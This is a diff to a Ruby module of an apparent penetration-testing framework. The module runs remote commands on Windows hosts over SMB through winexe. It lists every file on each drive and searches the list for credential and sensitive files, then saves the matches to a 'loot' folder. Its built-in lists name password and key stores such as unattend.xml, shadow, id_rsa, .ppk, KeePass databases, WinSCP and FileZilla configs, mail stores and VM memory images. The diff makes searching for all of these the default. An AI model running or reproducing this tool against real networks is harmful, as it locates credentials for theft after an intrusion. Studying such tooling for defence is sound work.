@@ -10,15 +10,17 @@ class Filefind < Poet::Scanner
 	
 	# formats and extensions 
 	# ie: %OFFICE%, %PASSWORD%, %KEYFILES%  
-	OFFICE_EXT = "*.xls, *.csv, *.doc, *.docx, *.pdf"
-	PASSWORD_EXT = "accounts.xml, unattend.xml, unattend.txt, sysprep.xml, *.passwd, passwd, shadow, passwd~, shadow~, passwd-, shadow-, tomcat-users.xml, RazerLoginData.xml, ultravnc.ini, profiles.xml, spark.properties, steam.vdf, WinSCP.ini, accounts.ini, ws_ftp.ini, svn.simple, config.dyndns, FileZilla.Server.xml"
-	KEYFILES_EXT = "*.kbdx, *.ppk, *id_rsa*, *.pem, *.crt, *.key"
-	CONFIG_EXT = "*.cfg, *.inf, *.ini, *.config, *.conf, *.setup, config.*, *.cnf, pref*.xml, *.preferences, *.properties"
-	BATCH_EXT = "*.bat, *.sh, *.ps, *.ps1, *.vbs, *.run"
-	MAIL_EXT = "*.pst, *.mbox, *.spool"
-	VM_EXT = "*.vmem, *.ova, *.vmdk, *.snapshot, *.vdi"
-	DB_EXT = "*.sql, *.db"
+	OFFICE_EXT = ".*xls$, .*csv$, .*doc$, .*docx$, .*pdf$"
+	PASSWORD_EXT = "accounts.xml$, unattend.xml$, unattend.txt$, sysprep.xml$, .*passwd$, passwd$, shadow$, passwd~$, shadow~$, passwd-$, shadow-$, tomcat-users.xml$, RazerLoginData.xml$, ultravnc.ini$, profiles.xml$, spark.properties$, steam.vdf$, WinSCP.ini$, accounts.ini$, ws_ftp.ini$, svn.simple$, config.dyndns$, FileZilla.Server.xml$"
+	KEYFILES_EXT = ".*kbdx$, .*ppk$, id_rsa, .*pem$, .*crt$, .*key$"
+	CONFIG_EXT = ".*cfg$, .*inf$, .*ini$, .*config$, .*conf$, .*setup$, .*cnf$, pref.*xml$, .*preferences$, .*properties$"
+	BATCH_EXT = ".*bat$, .*sh$, .*ps$, .*ps1$, .*vbs$, .*run$"
+	MAIL_EXT = ".*pst$, .*mbox$, .*spool$"
+	VM_EXT = ".*vmem$, .*ova$, .*vmdk$, .*snapshot$, .*vdi$"
+	DB_EXT = ".*sql$, .*db$, .*sqlite."
 	
+	# easy mode
+	ALL_EXT = OFFICE_EXT + PASSWORD_EXT + KEYFILES_EXT + CONFIG_EXT + BATCH_EXT + MAIL_EXT + VM_EXT + DB_EXT
 	@snapshot = false
 	
 	def setup
@@ -26,12 +28,13 @@ class Filefind < Poet::Scanner
 		puts 
 
 		@timeout = 0
+		@regexes = Array.new
 		
-		# Get valid path
-		print "Enter path to file or list of items or look for #{color_banner('[unattend.txt, unattend.xml, sysprep.*]')} :"
+		print "Enter path to newline separated file containing filenames to search for, or enter in comma separated files in the form of regular expressions. (Substitutions exist for commonly useful filetypes and extensions:\n#{color_banner('%OFFICE%')} : .*xls$, .*csv$, .*doc$, .*docx$, .*pdf$\n#{color_banner('%PASSWORD%')} : accounts.xml$, unattend.xml$, unattend.txt$, sysprep.xml$, .*passwd$, passwd$, shadow$, passwd~$, shadow~$, passwd-$, shadow-$, tomcat-users.xml$, RazerLoginData.xml$, ultravnc.ini$, profiles.xml$, spark.properties$, steam.vdf$, WinSCP.ini$, accounts.ini$, ws_ftp.ini$, svn.simple$, config.dyndns$, FileZilla.Server.xml$\n#{color_banner('%KEYFILES%')} : .*kbdx$, .*ppk$, id_rsa, .*pem$, .*crt$, .*key$\n#{color_banner('%CONFIG%')} : .*cfg$, .*inf$, .*ini$, .*config$, .*conf$, .*setup$, .*cnf$, pref.*xml$, .*preferences$, .*properties$\n#{color_banner('%BATCH%')} : .*bat$, .*sh$, .*ps$, .*ps1$, .*vbs$, .*run$\n#{color_banner('%MAIL%')} : .*pst$, .*mbox$, .*spool$\n#{color_banner('%VM%')} : .*vmem$, .*ova$, .*vmdk$, .*snapshot$, .*vdi$\n#{color_banner('%DB%')} -> .*sql$, .*db$, .*sqlite.\n#{color_banner('%ALL%')} : Combination of all of the above (default: [#{color_banner('%ALL%')}]):"
 		ext = rgets
 		if ext.empty?
-			ext = "unattend.txt, unattend.xml, sysprep.*"
+			ext = "%ALL%"
+		# Get valid path
 		elsif File.file? ext
 			temp = []
 			File.open(ext, "r").each_line {|line| temp << line}
@@ -48,8 +51,24 @@ class Filefind < Poet::Scanner
 		# TODO: make C:\\derp a randomized filename
 		# Perhaps make a check for TEMP files that are writeable - do a write check and confirm.
 		@command = ''
-		@command << '&& dir /s /b > C:\\derp'
-		ext.split(',').each {|file| @command << " && findstr #{file.strip} C:\\derp"}
+		@command << '& dir /s /b > C:\\derp'
+		
+		# substitute our prefills
+		subd = ''
+		ext.split(',').each do |e|
+			e = e.strip.gsub /%ALL%/, ALL_EXT
+			e = e.gsub /\%OFFICE%/, OFFICE_EXT
+			e = e.gsub /%PASSWORD%/, PASSWORD_EXT
+			e = e.gsub /%KEYFILES%/, KEYFILES_EXT
+			e = e.gsub /%CONFIG%/, CONFIG_EXT
+			e = e.gsub /%BATCH%/, BATCH_EXT
+			e = e.gsub /%MAIL%/, MAIL_EXT
+			e = e.gsub /%VM%/, VM_EXT
+			e = e.gsub /%DB%/, DB_EXT
+			e.split(',').each {|ee| @regexes.push(ee)}
+		end
+
+		@regexes.each {|file| @command = @command + " & findstr /i #{file.strip} C:\\derp"}
 		# ext.split(',').each {|file| @command << "
 		create_folder("#{@log}/loot") unless folder_exists("#{@log}/loot")
 		create_folder("#{@log}/loot/filefinder") unless folder_exists("#{@log}/loot/filefinder")
@@ -77,6 +96,7 @@ class Filefind < Poet::Scanner
 		drives.each do |drive|
 			# If final one, add uninstall to winexe
 			smboptions = "--uninstall #{smboptions}" if drive.eql? drives.last
+			## TODO: redo, cd [drive] doesnt work, misses all except current drive (C:\)
 			find = winexe(smboptions, "CMD /C cd #{drive}\\#{@command}")
 			# Continue on if nothing found
 			next if find =~ /File Not Found/
@@ -92,7 +112,7 @@ class Filefind < Poet::Scanner
 			print_bad("#{host.ljust(15)} - File(s) not found")
 		else
 			if files_found.lines.count > 2
-				print_good("#{host.ljust(15)} - #{files_found.lines.count} File(s) found")
+				print_good("#{host.ljust(15)} - #{files_found.lines.count} Interesting file(s) found")
 			else
 				files_print = Array.new
 				files_found.each_line {|line| files_print << line.split('\\').last.chomp}
@@ -109,10 +129,10 @@ class Filefind < Poet::Scanner
 
 		if @snapshot
 			if all_files.empty?
-				print_bad("#{host.ljust(15)} - No files founnd at all on target system??")
+				print_bad("#{host.ljust(15)} - No files found at all on target system??")
 			else
 				if all_files.lines.count > 2
-					print_good("#{host.ljust(15)} - #{files_found.lines.count} File(s) on system in total")
+					print_good("#{host.ljust(15)} - Filesystem snapshot retrieved")
 				else
 					files_print = Array.new
 					all_files.each_line {|line| files_print << line.split('\\').last.chomp}
@@ -132,8 +152,8 @@ class Filefind < Poet::Scanner
 	def finish
 		# Put ending titles
 		puts
-		puts "Total files found: #{@success}"
-		puts "File lists are located in: #{@log}/loot/filefinder/<host>_filelist.txt"
+		puts "Total files searched: #{@success}"
+		puts "Interesting file lists are located in: #{@log}/loot/filefinder/<host>_filelist.txt"
 
 		if @snapshot
 			puts "Full filesystem snapshot located in: #{@log}/loot/filefinder/<host>_allfiles.txt"
